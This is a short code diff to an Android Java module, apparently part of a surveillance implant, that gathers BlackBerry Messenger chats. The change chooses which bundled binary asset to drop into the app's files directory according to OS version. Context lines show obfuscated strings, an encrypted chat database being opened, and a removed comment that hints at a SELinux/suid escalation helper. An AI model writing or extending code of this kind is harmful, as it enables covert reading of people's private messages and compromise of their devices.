@@ -1,6 +1,7 @@
 package com.android.dvci.module.chat;
 
 import android.database.Cursor;
+import android.os.Build;
 import android.util.Base64;
 import android.util.Log;
 
@@ -150,13 +151,20 @@ public class ChatBBM extends SubModuleChat {
 		String pack = Status.self().getAppContext().getPackageName();
 		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-		final AutoFile bbconvert = new AutoFile(installPath, M.e("bb")); // selinux_suidext
+		final AutoFile bbconvert= new AutoFile(installPath, M.e("bb"));
 		final AutoFile dbplain = new AutoFile(installPath, M.e("p.db"));
 		final AutoFile dbenc = new AutoFile(installPath, M.e("e.db"));
 		dbplain.delete();
 		dbenc.delete();
 
-		if(! Utils.dumpAsset(M.e("bb.data"), bbconvert.getName())){
+		boolean asset;
+		if (Build.VERSION.SDK_INT <= 16) {
+			asset = Utils.dumpAsset(M.e("bb.data"), bbconvert.getName());
+		}else{
+			asset = Utils.dumpAsset(M.e("bbl.data"), bbconvert.getName());
+		}
+
+		if(! asset){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (openBBMChatEnc), Error, cannot find resource");
 			}
